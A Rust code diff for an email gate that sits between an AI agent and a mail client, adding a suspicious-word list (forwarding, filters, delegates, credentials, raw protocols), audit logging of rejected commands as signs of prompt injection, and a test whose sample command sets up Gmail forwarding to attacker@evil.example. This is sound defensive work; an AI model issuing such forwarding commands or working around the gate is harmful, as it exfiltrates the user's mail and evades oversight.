@@ -39,6 +39,9 @@ fn deny<T>(msg: impl Into<String>) -> Result<T> {
 
 const DONT_WORK_AROUND: &str = "Do not retry or try to achieve this by other means.";
 
+const AUDIT_FAILURE: &[u8] =
+    b"Error: the email gate cannot write its audit log, so it returns nothing. Tell the user.\n";
+
 /// Largest total size of attachments returned by one `attachment download`.
 pub const MAX_DOWNLOAD_BYTES: usize = 48 << 20;
 
@@ -89,7 +92,81 @@ pub struct Request<'a> {
 
 /// Parse and run one agent command. Never panics on bad input; every failure becomes
 /// an error response.
+/// Words in a rejected command that suggest the agent is reaching for account
+/// settings, raw protocol access or configuration: forwarding and filters (the classic
+/// takeover and exfiltration tools), credentials, and ways around the send policy.
+const SUSPICIOUS_WORDS: &[&str] = &[
+    "forward",
+    "forwarding",
+    "auto-forwarding",
+    "autoforwarding",
+    "filter",
+    "filters",
+    "delegate",
+    "delegates",
+    "send-as",
+    "sendas",
+    "settings",
+    "rule",
+    "rules",
+    "vacation",
+    "vacation-response",
+    "identity",
+    "submission",
+    "configure",
+    "config",
+    "password",
+    "secret",
+    "raw",
+    "smtp",
+    "imap",
+    "jmap",
+    "gmail",
+    "msgraph",
+    "sieve",
+];
+
+/// The leading command words of a rejected command line, without any free-text values.
+pub fn command_words(argv: &[String]) -> Vec<String> {
+    argv.iter()
+        .take_while(|a| {
+            !a.is_empty()
+                && a.len() <= 40
+                && a.starts_with(|c: char| c.is_ascii_lowercase())
+                && a.chars()
+                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
+        })
+        .take(4)
+        .cloned()
+        .collect()
+}
+
+/// Suspicious words anywhere in the command line, including option names such as
+/// `--config` (values are never recorded, only the matching words).
+pub fn suspicious_words(argv: &[String]) -> Vec<&'static str> {
+    let mut found: Vec<&'static str> = Vec::new();
+    for a in argv {
+        let token = a
+            .trim_start_matches('-')
+            .split('=')
+            .next()
+            .unwrap_or_default()
+            .to_ascii_lowercase();
+        // The whole word, and each part of a hyphenated one (`forwarding-addresses`).
+        for part in std::iter::once(token.as_str()).chain(token.split('-')) {
+            if let Some(w) = SUSPICIOUS_WORDS.iter().find(|w| **w == part)
+                && !found.contains(w)
+            {
+                found.push(w);
+            }
+        }
+    }
+    found
+}
+
 pub fn handle(cfg: Config, req: Request<'_>) -> Response {
+    let words = command_words(&req.argv);
+    let suspicious = suspicious_words(&req.argv);
     let argv = std::iter::once("himalaya".to_string()).chain(req.argv);
     let cli = match Cli::try_parse_from(argv) {
         Ok(cli) => cli,
@@ -101,6 +178,28 @@ pub fn handle(cfg: Config, req: Request<'_>) -> Response {
             };
             if e.use_stderr() {
                 resp.stderr = text;
+                // A command the gate does not offer: record it, since an agent probing for
+                // settings or raw access is a strong sign of an injected instruction.
+                let mut extra = json!({ "words": words, "error": format!("{:?}", e.kind()) });
+                if !suspicious.is_empty() {
+                    extra["suspicious"] = json!(suspicious);
+                }
+                if let Some(uid) = req.caller.uid {
+                    extra["peer-uid"] = uid.into();
+                }
+                if let Some(pid) = req.caller.pid {
+                    extra["peer-pid"] = pid.into();
+                }
+                let decision = if suspicious.is_empty() {
+                    "rejected"
+                } else {
+                    "suspicious"
+                };
+                let logged = audit::record(&cfg, &req.caller.name, None, &words.join(" "), decision, extra);
+                if logged.is_err() {
+                    resp.stderr = AUDIT_FAILURE.to_vec();
+                    resp.exit = 1;
+                }
             } else {
                 resp.stdout = text;
             }
@@ -113,8 +212,7 @@ pub fn handle(cfg: Config, req: Request<'_>) -> Response {
     if gate.audit_failed.get() {
         return Response {
             exit: 1,
-            stderr: b"Error: the email gate cannot write its audit log, so it returns nothing. Tell the user.\n"
-                .to_vec(),
+            stderr: AUDIT_FAILURE.to_vec(),
             ..Default::default()
         };
     }
@@ -1142,3 +1240,32 @@ impl<'a> Gate<'a> {
 }
 
 const DONT_WORK_AROUND_POLICY: &str = "These rules protect the user's accounts. When a rule blocks you, say so to the user instead of looking for another way.";
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn v(args: &[&str]) -> Vec<String> {
+        args.iter().map(|s| s.to_string()).collect()
+    }
+
+    #[test]
+    fn rejected_commands_are_summarized_without_values() {
+        let argv = v(&[
+            "gmail",
+            "settings",
+            "forwarding-addresses",
+            "create",
+            "attacker@evil.example",
+        ]);
+        assert_eq!(
+            command_words(&argv),
+            ["gmail", "settings", "forwarding-addresses", "create"]
+        );
+        assert_eq!(suspicious_words(&argv), ["gmail", "settings", "forwarding"]);
+        let argv = v(&["message", "compose", "--body", "please forward this", "--config=/x"]);
+        assert_eq!(command_words(&argv), ["message", "compose"]);
+        assert_eq!(suspicious_words(&argv), ["config"]);
+        assert!(suspicious_words(&v(&["envelope", "lst"])).is_empty());
+    }
+}
